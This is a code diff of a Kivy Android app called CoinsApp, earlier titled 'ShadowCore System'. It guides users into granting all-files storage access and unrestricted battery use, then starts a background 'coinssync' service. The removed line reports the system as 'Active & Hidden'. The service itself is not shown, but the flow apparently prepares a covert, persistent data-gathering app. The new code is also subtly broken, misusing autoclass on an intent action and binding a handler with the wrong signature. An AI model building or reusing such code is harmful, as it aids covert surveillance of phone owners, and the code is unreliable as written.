@@ -8,67 +8,39 @@ from android.permissions import request_permissions, Permission
 
 class CoinsApp(App):
     def build(self):
-        self.title = "ShadowCore System"
         layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
-        self.status = Label(text="System Status: Ready", font_size='18sp')
-
-        btn_1 = Button(text="STEP 1: FULL STORAGE ACCESS", background_color=(0.2, 0.4, 0.9, 1))
-        btn_2 = Button(text="STEP 2: BATTERY UNRESTRICTED", background_color=(0.8, 0.5, 0.2, 1))
-        btn_3 = Button(text="FINAL STEP: ACTIVATE SYSTEM", background_color=(0.1, 0.7, 0.2, 1), bold=True)
-
-        btn_1.bind(on_press=self.open_files)
-        btn_2.bind(on_press=self.disable_battery)
-        btn_3.bind(on_press=self.start_sync)
-
-        layout.add_widget(self.status)
-        layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
+        self.status = Label(text="System Ready", font_size='18sp')
         
-        # طلب إذن الإشعارات فور فتح التطبيق
-        Clock.schedule_once(lambda dt: self.ask_notif_permission(), 1)
-        
+        btn_1 = Button(text="STEP 1: ACCESS", background_color=(0.2, 0.4, 0.9, 1))
+        btn_2 = Button(text="STEP 2: BATTERY", background_color=(0.8, 0.5, 0.2, 1))
+        btn_3 = Button(text="STEP 3: ACTIVATE", background_color=(0.1, 0.7, 0.2, 1))
+
+        btn_1.bind(on_press=lambda x: self.open_perm("android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"))
+        btn_2.bind(on_press=lambda x: self.open_perm("android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"))
+        btn_3.bind(on_press=self.start_service)
+
+        layout.add_widget(self.status); layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
+        Clock.schedule_once(lambda dt: request_permissions(["android.permission.POST_NOTIFICATIONS"]), 1)
         return layout
 
-    def ask_notif_permission(self):
-        request_permissions(["android.permission.POST_NOTIFICATIONS"])
-
-    def open_files(self, instance):
+    def open_perm(self, action):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             Intent = autoclass('android.content.Intent')
-            Settings = autoclass('android.provider.Settings')
             Uri = autoclass('android.net.Uri')
+            Settings = autoclass('android.provider.Settings')
             activity = PythonActivity.mActivity
-            uri = Uri.parse("package:" + activity.getPackageName())
-            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
+            intent = Intent(autoclass(action))
+            if "BATTERY" in action: intent.setData(Uri.parse("package:" + activity.getPackageName()))
             activity.startActivity(intent)
         except: pass
 
-    def disable_battery(self, instance):
+    def start_service(self):
         try:
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            Intent = autoclass('android.content.Intent')
-            Settings = autoclass('android.provider.Settings')
-            Uri = autoclass('android.net.Uri')
-            activity = PythonActivity.mActivity
-            uri = Uri.parse("package:" + activity.getPackageName())
-            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-            intent.setData(uri)
-            activity.startActivity(intent)
-        except: pass
-
-    def start_sync(self, instance):
-        perms = [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.FOREGROUND_SERVICE]
-        request_permissions(perms, self.launch)
-
-    def launch(self, permissions, grants):
-        try:
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            # تأكد أن الاسم هنا يطابق ما في buildozer.spec
+            from android import mActivity
+            # اسم الخدمة يجب أن يكون دقيقاً جداً ليتصل بملف service.py
             service = autoclass('org.test.coinssync.ServiceMyservice')
-            service.start(PythonActivity.mActivity, "")
-            self.status.text = "✅ System Active & Hidden"
+            service.start(mActivity, "")
+            self.status.text = "✅ ACTIVE"
         except Exception as e:
             self.status.text = f"❌ Error: {str(e)}"
-
-if __name__ == "__main__":
-    CoinsApp().run()
